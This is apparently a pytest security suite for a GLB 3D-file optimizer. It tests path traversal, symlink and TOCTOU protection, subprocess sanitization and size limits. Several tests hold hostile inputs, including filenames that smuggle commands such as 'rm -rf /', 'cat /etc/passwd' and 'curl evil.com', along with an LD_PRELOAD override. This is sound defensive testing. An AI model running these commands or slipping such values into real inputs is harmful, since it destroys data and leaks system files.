"""
Security-focused tests for GLB Optimizer
Tests path validation, injection attacks, and security boundaries
"""
import pytest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock
from optimizer import GLBOptimizer


class TestPathValidation:
    """Test path validation security measures"""
    
    @pytest.mark.security
    def test_path_traversal_prevention(self, optimizer_with_temp_dirs, test_data_generator):
        """Test that path traversal attacks are blocked"""
        optimizer = optimizer_with_temp_dirs
        
        for malicious_path in test_data_generator.create_path_traversal_attempts():
            with pytest.raises(ValueError, match="Path outside allowed directories"):
                optimizer._validate_path(malicious_path)
    
    @pytest.mark.security
    def test_symlink_attack_prevention(self, optimizer_with_temp_dirs, temp_dir):
        """Test that symlink attacks are detected and blocked"""
        optimizer = optimizer_with_temp_dirs
        
        # Create a symlink pointing outside allowed directories
        target_file = Path(temp_dir) / 'outside_target.txt'
        target_file.write_text('sensitive data')
        
        uploads_dir = Path(temp_dir) / 'uploads'
        uploads_dir.mkdir(exist_ok=True)
        symlink_path = uploads_dir / 'malicious_link.glb'
        
        try:
            symlink_path.symlink_to(target_file)
            
            with pytest.raises(ValueError, match="Path outside allowed directories"):
                optimizer._validate_path(str(symlink_path))
        except OSError:
            # Symlinks might not be supported on some systems
            pytest.skip("Symlinks not supported on this system")
    
    @pytest.mark.security
    def test_directory_restrictions(self, optimizer_with_temp_dirs, temp_dir):
        """Test that files outside allowed directories are rejected"""
        optimizer = optimizer_with_temp_dirs
        
        # Try to access file outside allowed directories
        outside_file = Path(temp_dir) / 'outside.glb'
        outside_file.write_text('outside data')
        
        with pytest.raises(ValueError, match="Path outside allowed directories"):
            optimizer._validate_path(str(outside_file))
    
    @pytest.mark.security
    def test_command_injection_in_filenames(self, optimizer_with_temp_dirs, uploads_dir):
        """Test that command injection via filenames is prevented"""
        optimizer = optimizer_with_temp_dirs
        
        dangerous_filenames = [
            'test; rm -rf /',
            'test | cat /etc/passwd',
            'test && whoami',
            'test`whoami`',
            'test$(whoami)',
            'test;$(curl evil.com)',
        ]
        
        for filename in dangerous_filenames:
            filepath = Path(uploads_dir) / filename
            filepath.write_text('test data')
            
            with pytest.raises(ValueError, match="contains dangerous characters"):
                optimizer._validate_path(str(filepath))
    
    @pytest.mark.security
    def test_toctou_protection(self, optimizer_with_temp_dirs, uploads_dir):
        """Test Time-of-Check-Time-of-Use (TOCTOU) protection"""
        optimizer = optimizer_with_temp_dirs
        
        # Create valid file
        test_file = Path(uploads_dir) / 'test.glb'
        test_file.write_text('valid content')
        
        # Validate path
        validated_path = optimizer._validate_path(str(test_file))
        
        # Simulate TOCTOU attack: file is replaced after validation
        test_file.unlink()
        malicious_target = Path('/etc/passwd')
        if malicious_target.exists():
            try:
                test_file.symlink_to(malicious_target)
                
                # Immediate re-validation should catch the attack
                with pytest.raises(ValueError):
                    optimizer._immediate_path_validation(validated_path)
            except OSError:
                pytest.skip("Cannot create symlinks on this system")
    
    @pytest.mark.security
    def test_safe_file_operation_validation(self, optimizer_with_temp_dirs, uploads_dir):
        """Test that safe file operations re-validate paths"""
        optimizer = optimizer_with_temp_dirs
        
        test_file = Path(uploads_dir) / 'test.glb'
        test_file.write_text('test content')
        
        # Test safe file operation with valid path
        result = optimizer._safe_file_operation(str(test_file), 'exists')
        assert result is True
        
        # Test with non-existent file
        non_existent = Path(uploads_dir) / 'nonexistent.glb'
        result = optimizer._safe_file_operation(str(non_existent), 'exists')
        assert result is False


class TestSubprocessSecurity:
    """Test subprocess execution security"""
    
    @pytest.mark.security
    def test_environment_sanitization(self, optimizer_with_temp_dirs, mock_subprocess):
        """Test that subprocess environment is sanitized"""
        optimizer = optimizer_with_temp_dirs
        
        # Mock dangerous environment variables
        with patch.dict(os.environ, {
            'LD_PRELOAD': '/malicious/lib.so',
            'PYTHONPATH': '/malicious/path',
            'LD_LIBRARY_PATH': '/malicious/libs'
        }):
            
            # Run subprocess command
            optimizer._run_subprocess(['echo', 'test'], 'test_step', 'test description')
            
            # Verify subprocess was called with sanitized environment
            mock_subprocess.assert_called_once()
            call_args = mock_subprocess.call_args
            
            # Check that dangerous variables are not in the environment
            env = call_args[1].get('env', {})
            assert 'LD_PRELOAD' not in env
            assert 'PYTHONPATH' not in env
            assert 'LD_LIBRARY_PATH' not in env
    
    @pytest.mark.security
    def test_shell_injection_prevention(self, optimizer_with_temp_dirs, mock_subprocess):
        """Test that shell injection is prevented"""
        optimizer = optimizer_with_temp_dirs
        
        # Try to inject shell commands
        malicious_args = ['echo', 'test; rm -rf /']
        
        optimizer._run_subprocess(malicious_args, 'test_step', 'test description')
        
        # Verify subprocess.run was called with shell=False
        mock_subprocess.assert_called_once()
        call_kwargs = mock_subprocess.call_args[1]
        assert call_kwargs.get('shell', True) is False
    
    @pytest.mark.security
    def test_timeout_enforcement(self, optimizer_with_temp_dirs):
        """Test that subprocess timeouts are enforced"""
        optimizer = optimizer_with_temp_dirs
        
        with patch('optimizer.subprocess.run') as mock_run:
            # Mock timeout exception
            import subprocess
            mock_run.side_effect = subprocess.TimeoutExpired(['sleep', '1000'], 10)
            
            result = optimizer._run_subprocess(['sleep', '1000'], 'test_step', 'test description', timeout=1)
            
            assert result['success'] is False
            assert 'timeout' in result['error'].lower()


class TestFileValidation:
    """Test GLB file validation security"""
    
    @pytest.mark.security
    def test_file_size_limits(self, optimizer_with_temp_dirs, temp_dir):
        """Test that file size limits prevent DoS attacks"""
        optimizer = optimizer_with_temp_dirs
        
        # Create oversized file
        huge_file = Path(temp_dir) / 'huge.glb'
        with open(huge_file, 'wb') as f:
            f.write(b'x' * (200 * 1024 * 1024))  # 200MB
        
        result = optimizer._validate_file_size(str(huge_file))
        assert result['success'] is False
        assert 'too large' in result['error'].lower()
    
    @pytest.mark.security
    def test_malformed_glb_rejection(self, optimizer_with_temp_dirs, temp_dir, test_data_generator):
        """Test that malformed GLB files are rejected"""
        optimizer = optimizer_with_temp_dirs
        
        corruption_types = ['header', 'version', 'truncated']
        
        for corruption_type in corruption_types:
            corrupted_file = Path(temp_dir) / f'corrupted_{corruption_type}.glb'
            test_data_generator.create_corrupted_glb(str(corrupted_file), corruption_type)
            
            result = optimizer.validate_glb(str(corrupted_file), mode='header')
            assert result['success'] is False
            assert 'invalid' in result['error'].lower() or 'corrupted' in result['error'].lower()
    
    @pytest.mark.security
    def test_header_injection_prevention(self, optimizer_with_temp_dirs, temp_dir):
        """Test that GLB header injection attacks are prevented"""
        optimizer = optimizer_with_temp_dirs
        
        # Create file with suspicious header content
        malicious_file = Path(temp_dir) / 'malicious.glb'
        with open(malicious_file, 'wb') as f:
            # Valid GLB magic but with suspicious JSON content
            f.write(b'glTF')
            f.write((2).to_bytes(4, 'little'))
            f.write((1000).to_bytes(4, 'little'))
            f.write((50).to_bytes(4, 'little'))
            f.write(b'JSON')
            # JSON with potential script injection
            malicious_json = b'{"asset":{"version":"2.0"},"extras":{"script":"<script>alert(1)</script>"}}'
            f.write(malicious_json[:50])
        
        # Validation should pass (we don't parse JSON content for security)
        # but file operations should be safe
        result = optimizer.validate_glb(str(malicious_file), mode='header')
        # This should succeed as we only validate header structure
        assert result['success'] is True


class TestConfigurationSecurity:
    """Test configuration and environment security"""
    
    @pytest.mark.security
    def test_environment_variable_injection(self):
        """Test that environment variables cannot inject malicious values"""
        
        malicious_env = {
            'GLB_MAX_FILE_SIZE_MB': '999999999',  # Extremely large value
            'GLB_SUBPROCESS_TIMEOUT': '0',        # Zero timeout
            'GLB_MAX_PARALLEL_WORKERS': '-1',     # Negative workers
        }
        
        with patch.dict(os.environ, malicious_env):
            from config import OptimizationConfig
            
            config = OptimizationConfig.from_env()
            
            # Values should be sanitized or use safe defaults
            assert config.MAX_FILE_SIZE_MB <= 1000  # Reasonable maximum
            assert config.SUBPROCESS_TIMEOUT > 0    # Positive timeout
            assert config.MAX_PARALLEL_WORKERS > 0  # Positive workers
    
    @pytest.mark.security
    def test_configuration_validation(self):
        """Test that configuration values are validated"""
        from config import OptimizationConfig
        
        # Test with valid configuration
        valid_config = OptimizationConfig.from_env()
        issues = valid_config.validate()
        
        # Should have no critical issues
        critical_issues = [issue for issue in issues if 'CRITICAL' in issue]
        assert len(critical_issues) == 0


class TestMemorySafety:
    """Test memory safety and resource management"""
    
    @pytest.mark.security
    def test_temp_file_cleanup(self, optimizer_with_temp_dirs, temp_dir):
        """Test that temporary files are properly cleaned up"""
        temp_files_before = set(Path(temp_dir).rglob('*'))
        
        with optimizer_with_temp_dirs as optimizer:
            # Create some temporary files
            temp_file = Path(optimizer._secure_temp_dir) / 'test_temp.glb'
            temp_file.write_text('temporary data')
            
            # Verify temp file exists
            assert temp_file.exists()
        
        # After context manager exit, temp files should be cleaned
        # Note: In test environment, cleanup might not remove the directory itself
        # but the content should be cleaned
        if Path(optimizer._secure_temp_dir).exists():
            temp_contents = list(Path(optimizer._secure_temp_dir).iterdir())
            # Contents should be minimal or empty
            assert len(temp_contents) <= 1  # Allow for directory structure
    
    @pytest.mark.security
    def test_resource_limits(self, optimizer_with_temp_dirs):
        """Test that resource usage is limited"""
        optimizer = optimizer_with_temp_dirs
        
        # Test parallel worker limits
        from config import OptimizationConfig
        config = OptimizationConfig.from_env()
        
        # Should have reasonable limits
        assert config.MAX_PARALLEL_WORKERS <= 8  # Not too many workers
        assert config.PARALLEL_TIMEOUT <= 600    # Reasonable timeout
        assert config.SUBPROCESS_TIMEOUT <= 600  # Reasonable subprocess timeout